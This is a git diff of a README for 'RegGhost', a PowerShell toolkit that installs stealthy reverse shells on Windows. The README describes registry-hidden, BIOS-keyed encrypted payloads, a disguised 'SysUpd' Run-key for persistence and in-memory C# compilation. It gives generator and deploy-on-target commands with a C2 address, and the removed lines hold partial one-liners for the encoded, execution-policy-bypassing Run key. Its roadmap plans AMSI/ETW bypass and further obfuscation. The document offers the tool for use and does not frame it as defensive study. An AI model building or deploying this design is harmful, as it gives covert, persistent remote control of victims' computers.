@@ -1,74 +1,61 @@
 # RegGhost
 
-![Phantom Key Logo](sandbox:/mnt/data/A_logo_for_a_software_or_cybersecurity_product_nam.png)
+![Phantom Key Logo](logo.png)
 
-A compact, two-stage PowerShell toolkit designed for stealthy reverse shells on Windows. It leverages machine-specific encryption, in-memory execution, and registry-based persistence—no payload files remain on disk.
+RegGhost is a compact, two-stage PowerShell toolkit for stealthy, machine-bound reverse shells on Windows. It uses BIOS-derived XOR encryption, in-memory C# compilation, and registry-based persistence—leaving no payload files on disk.
 
 ---
 
 ## 🛠️ Features
 
-**1. Two-Stage Architecture**
+1. **Two-Stage Architecture**
 
-* **Setup Stage** (`smaller_setup.ps1`):
+   * **Setup Stage** (`smaller_setup.ps1`)
 
-  * Base64-encoded C# payload is XOR-encrypted with a BIOS-derived key and stored in `HKCU:\Software\WindowsUpdate\DataCache`.
-  * Installs a single `Run`-key entry (`SysUpd`) pointing to an encoded PowerShell stub, ensuring execution at each user logon with no `.ps1` files on disk.
-* **Execution Stage** (`small_execute.ps1`):
+     * Reads a Base64-encoded C# payload (with injected, obfuscated C2 host/port).
+     * XOR-encrypts the payload using the BIOS serial (via `(Get-WmiObject Win32_BIOS).SerialNumber.Trim()`).
+     * Stores ciphertext under `HKCU:\Software\WindowsUpdate\DataCache`.
+     * Creates a `Run`-key entry (`SysUpd`) that launches an encoded PowerShell stub at logon—no `.ps1` files remain on disk.
+   * **Execution Stage** (`small_execute.ps1`)
 
-  * Reads, decrypts, and compiles the C# payload in memory via `Add-Type`.
-  * Invokes `C_XXXXX::Start()` (customizable class name) to establish a persistent reverse shell loop.
+     * Retrieves and decrypts the registry blob in memory.
+     * Compiles the C# source via `Add-Type -TypeDefinition`.
+     * Executes the auto-detected payload class (`<YourClass>::Start()`) in a persistent reverse-shell loop.
 
-**2. Dynamic, Host-Bound Encryption**
+2. **Host & Port Obfuscation**
 
-* Encryption key derived from `(Get-WmiObject Win32_BIOS).SerialNumber`, binding payload to the specific machine.
-* XOR + Base64 obfuscation conceals plaintext payloads in the registry.
+   * Host segments and port are Base64-encoded and reconstructed at runtime, hiding cleartext networking details in the script.
 
-**3. In-Memory C# Compilation**
+3. **Machine-Bound Encryption**
 
-* Utilizes `Add-Type` to compile and load decrypted source at runtime, avoiding any disk I/O for the payload.
+   * Encryption key derived from BIOS serial number ensures the payload only runs on the target host.
 
-**4. Registry-Only Storage & Persistence**
+4. **Minimal Footprint**
 
-* **Payload** stored as a string value under `HKCU:\Software\WindowsUpdate\DataCache`.
-* **Persistence** via `HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\SysUpd` running `powershell -EncodedCommand` stub.
-
-**5. Minimal Footprint**
-
-* No additional binaries; relies solely on native PowerShell and .NET.
-* Build outputs organized into randomly-named phonetic folders (Alpha, Bravo, Charlie, etc.).
+   * No additional binaries or files on disk beyond the one-line setup stub.
+   * Outputs organized into randomly named phonetic folders (Alpha, Bravo, Charlie, etc.).
 
 ---
 
 ## 📂 Components
 
-### 1. `smaller_setup.ps1`
+* **`smaller_setup.ps1`**
 
-```powershell
-# Auto-generated one-liner:
-$k=(gwmi win32_bios).serialnumber.trim(); ... sp HKCU:\Software\Microsoft\Windows\CurrentVersion\Run SysUpd "powershell -NoP -EP Bypass -Enc $enc"
-```
+  * One-liner that encrypts and stores the C# payload in the registry and sets up persistence.
 
-* Decrypts and decodes the embedded Base64 C# payload.
-* Stores ciphertext in the registry and installs persistence via Run key.
+* **`small_execute.ps1`**
 
-### 2. `small_execute.ps1`
+  * One-liner that decrypts, compiles, and launches the reverse-shell in memory.
 
-```powershell
-# Auto-generated one-liner:
-$k=(gwmi win32_bios).serialnumber.trim(); ... [<YourClass>]::Start()
-```
+* **`generate_shell.py`**
 
-* Reads registry blob, decrypts, compiles payload in memory, and launches the reverse shell.
+  * Python CLI for host/port injection, obfuscation, and registry integration.
+  * Usage:
 
-### 3. `generate_shell.py`
-
-* Python CLI that builds both PS1 stubs with host/port injection, obfuscation, and encryption:
-
-  ```bash
-  python generate_shell.py -H <C2_IP> -P <PORT>
-  ```
-* Outputs a new folder named from the phonetic alphabet (Alpha, Bravo, …).
+    ```bash
+    python generate_shell.py -H <C2_IP> -P <PORT> [-f <payload.cs>]
+    ```
+  * Creates a new `<PhoneticName>/` folder containing both PS1 scripts.
 
 ---
 
@@ -80,7 +67,7 @@ $k=(gwmi win32_bios).serialnumber.trim(); ... [<YourClass>]::Start()
    python generate_shell.py -H 10.10.14.1 -P 4444
    ```
 
-   * Reads `payload.cs`, injects obfuscated host/port, encrypts, and creates PS1 files in a new folder.
+   * Reads `payload.cs`, injects and obfuscates host/port, encrypts payload, and writes `smaller_setup.ps1` and `small_execute.ps1` into a new folder.
 
 2. **Deploy on Target**
 
@@ -88,11 +75,11 @@ $k=(gwmi win32_bios).serialnumber.trim(); ... [<YourClass>]::Start()
    .\Alpha\smaller_setup.ps1
    ```
 
-   * Installs encrypted payload and persistence without leaving any scripts on disk.
+   * Installs encrypted payload and persistence via registry—no scripts left on disk.
 
 3. **Automatic Execution**
 
-   * On next user logon, the Run-key stub auto-executes, decrypting and running the reverse shell.
+   * On the next user logon, the Run-key stub runs, decrypts payload in memory, and establishes the reverse shell.
 
 4. **Manual Testing**
 
@@ -100,16 +87,22 @@ $k=(gwmi win32_bios).serialnumber.trim(); ... [<YourClass>]::Start()
    .\Alpha\small_execute.ps1
    ```
 
-   * Useful for quick staging or validation without reboot.
+   * Runs the decrypted payload immediately (useful for staging or validation).
 
 ---
 
-## 🚧 Limitations & Future Enhancements
+## 🚧 Limitations & Roadmap
 
-* **Stronger Encryption**: Replace XOR with AES-CBC and random IV for enhanced confidentiality.
-* **Fallback Persistence**: Add Scheduled Tasks or WMI Event Subscriptions as fallback.
-* **Evasion**: Integrate AMSI/ETW bypass techniques and code obfuscation (e.g. Invoke-Obfuscation).
-* **Logging**: Implement silent error logging to Event Log or hidden file for reliable troubleshooting.
+* **Encryption Strength**: Swap XOR for AES-CBC with a random IV for improved confidentiality.
+* **Fallback Persistence**: Add Scheduled Tasks or WMI Event Subscription options if Run-key is unavailable.
+* **Evasion Techniques**: Integrate AMSI/ETW bypass or further code obfuscation (e.g., `Invoke-Obfuscation`).
+* **Logging & Debugging**: Implement silent error logging to the Event Log or hidden file for reliability.
+
+---
+
+## 📄 License
+
+This project is licensed under the MIT License. See [LICENSE.md](LICENSE.md) for details.
 
 ---
 
